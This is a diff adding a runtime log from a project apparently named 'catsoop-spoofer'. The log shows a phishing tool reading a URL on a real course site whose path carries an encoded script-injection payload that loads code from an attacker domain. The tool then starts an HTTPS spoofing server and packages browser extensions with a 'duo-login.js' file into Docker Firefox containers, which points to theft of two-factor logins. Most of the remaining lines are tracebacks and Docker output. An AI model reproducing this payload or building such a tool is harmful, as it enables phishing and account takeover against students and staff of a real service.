@@ -1,0 +1,233 @@
+Read Phishing URL: https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/
+Read Attacker Domain Name: 6002.ml
+Read Firefox Path: /home/tjz/.mozilla/firefox
+Multiple ipv4 addresses found. Which one is portforwarding on port 80?
+0: 127.0.0.1
+1: 192.168.0.17
+2: 172.17.0.1
+Select IP by index:Traceback (most recent call last):
+  File "run-spoof.py", line 38, in <module>
+    i = input("Select IP by index:")
+OSError: [Errno 9] Bad file descriptor
+starting docker process at: 1589755146453
+Archive:  /tmp/duo10528.zip
+  inflating: /tmp/duo10528/background.js  
+  inflating: /tmp/duo10528/duo-login.js  
+  inflating: /tmp/duo10528/manifest.json  
+  inflating: /tmp/duo10528/popup.html  
+ extracting: /tmp/duo10528/icon32.png  
+  inflating: /tmp/duo10528/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 65%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589755146606
+starting docker process at: 1589755146915
+Archive:  /tmp/duo10529.zip
+  inflating: /tmp/duo10529/background.js  
+  inflating: /tmp/duo10529/duo-login.js  
+  inflating: /tmp/duo10529/manifest.json  
+  inflating: /tmp/duo10529/popup.html  
+ extracting: /tmp/duo10529/icon32.png  
+  inflating: /tmp/duo10529/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 65%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589755147087
+Read Phishing URL: https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/
+Read Attacker Domain Name: 6002.ml
+Read Firefox Path: /home/tjz/.mozilla/firefox
+Localhost is 192.168.0.17
+Starting https server on port 443...
+Using key /home/tjz/Programming/catsoop-spoofer/ssl/key.pem
+Using certificate /home/tjz/Programming/catsoop-spoofer/ssl/cert.pem
+Trying to host https server on 192.168.0.17:443
+Traceback (most recent call last):
+  File "run-spoof.py", line 47, in <module>
+    https_server.startServer(host)
+  File "/home/tjz/Programming/catsoop-spoofer/client/https_server.py", line 21, in startServer
+    httpd = HTTPServer((host, 443), SilentHTTPRequestHandler)
+  File "/usr/lib/python3.6/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.6/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.6/socketserver.py", line 470, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+Read Phishing URL: https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/
+Read Attacker Domain Name: 6002.ml
+Read Firefox Path: /home/tjz/.mozilla/firefox
+Localhost is 192.168.0.17
+Starting https server on port 443...
+Using key /home/tjz/Programming/catsoop-spoofer/ssl/key.pem
+Using certificate /home/tjz/Programming/catsoop-spoofer/ssl/cert.pem
+Trying to host https server on 192.168.0.17:443
+Traceback (most recent call last):
+  File "run-spoof.py", line 47, in <module>
+    https_server.startServer(host)
+  File "/home/tjz/Programming/catsoop-spoofer/client/https_server.py", line 21, in startServer
+    httpd = HTTPServer((host, 443), SilentHTTPRequestHandler)
+  File "/usr/lib/python3.6/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.6/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.6/socketserver.py", line 470, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+f15b31bf003c96453e99a002cbe96ab55ab6dd0004047ab17aceb6dde14a30c5
+starting docker process at: 1589755483637
+Archive:  /tmp/duo10529.zip
+  inflating: /tmp/duo10529/background.js  
+  inflating: /tmp/duo10529/duo-login.js  
+  inflating: /tmp/duo10529/manifest.json  
+  inflating: /tmp/duo10529/popup.html  
+ extracting: /tmp/duo10529/icon32.png  
+  inflating: /tmp/duo10529/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 65%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589755484250
+docker: Error response from daemon: Conflict. The container name "/firefoxSID10529" is already in use by container "f15b31bf003c96453e99a002cbe96ab55ab6dd0004047ab17aceb6dde14a30c5". You have to remove (or rename) that container to be able to reuse that name.
+See 'docker run --help'.
+starting docker process at: 1589755484290
+Archive:  /tmp/duo10530.zip
+  inflating: /tmp/duo10530/background.js  
+  inflating: /tmp/duo10530/duo-login.js  
+  inflating: /tmp/duo10530/manifest.json  
+  inflating: /tmp/duo10530/popup.html  
+ extracting: /tmp/duo10530/icon32.png  
+  inflating: /tmp/duo10530/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 65%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589755484461
+starting docker process at: 1589756091346
+Archive:  /tmp/duo10531.zip
+  inflating: /tmp/duo10531/background.js  
+  inflating: /tmp/duo10531/duo-login.js  
+  inflating: /tmp/duo10531/manifest.json  
+  inflating: /tmp/duo10531/popup.html  
+ extracting: /tmp/duo10531/icon32.png  
+  inflating: /tmp/duo10531/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 65%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589756096515
+6e07d3f499cb27da99502d38eb5ff9fb33a4cae763c0916974d29e4aafdf2368
+starting docker process at: 1589756105319
+Archive:  /tmp/duo10532.zip
+  inflating: /tmp/duo10532/background.js  
+  inflating: /tmp/duo10532/duo-login.js  
+  inflating: /tmp/duo10532/manifest.json  
+  inflating: /tmp/duo10532/popup.html  
+ extracting: /tmp/duo10532/icon32.png  
+  inflating: /tmp/duo10532/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 65%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589756105547
+f6da839dcb34b032605090dca1f0c8404252c45be08f863b734071d8cf3ecbca
+Archive:  /tmp/duo10531.zip
+  inflating: /tmp/duo10531/background.js  
+  inflating: /tmp/duo10531/duo-login.js  
+  inflating: /tmp/duo10531/manifest.json  
+  inflating: /tmp/duo10531/popup.html  
+ extracting: /tmp/duo10531/icon32.png  
+  inflating: /tmp/duo10531/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+the input device is not a TTY
+starting docker process at: 1589756149065
+Archive:  /tmp/duo10533.zip
+  inflating: /tmp/duo10533/background.js  
+  inflating: /tmp/duo10533/duo-login.js  
+  inflating: /tmp/duo10533/manifest.json  
+  inflating: /tmp/duo10533/popup.html  
+ extracting: /tmp/duo10533/icon32.png  
+  inflating: /tmp/duo10533/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 65%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589756149273
+53f36dd815896d340dd2a56d9e978f5135dbbb30494fd73d0db29608b7a0caab
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 97, in counter
+    await websocket.send(json.dumps({"pong":"pong"}));
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 555, in send
+    await self.ensure_open()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 812, in ensure_open
+    raise self.connection_closed_exc()
+websockets.exceptions.ConnectionClosedError: code = 4001 (private use), no reason
+Archive:  /tmp/duo10531.zip
+  inflating: /tmp/duo10531/background.js  
+  inflating: /tmp/duo10531/duo-login.js  
+  inflating: /tmp/duo10531/manifest.json  
+  inflating: /tmp/duo10531/popup.html  
+ extracting: /tmp/duo10531/icon32.png  
+  inflating: /tmp/duo10531/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+the input device is not a TTY
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 827, in transfer_data
+    message = await self.read_message()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 895, in read_message
+    frame = await self.read_data_frame(max_size=self.max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 971, in read_data_frame
+    frame = await self.read_frame(max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 1051, in read_frame
+    extensions=self.extensions,
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/framing.py", line 105, in read
+    data = await reader(2)
+  File "/usr/lib/python3.6/asyncio/streams.py", line 674, in readexactly
+    yield from self._wait_for_data('readexactly')
+  File "/usr/lib/python3.6/asyncio/streams.py", line 464, in _wait_for_data
+    yield from self._waiter
+concurrent.futures._base.CancelledError
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 93, in counter
+    async for message in websocket:
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
+    yield await self.recv()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 509, in recv
+    await self.ensure_open()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 812, in ensure_open
+    raise self.connection_closed_exc()
+websockets.exceptions.ConnectionClosedError: code = 1006 (connection closed abnormally [internal]), no reason
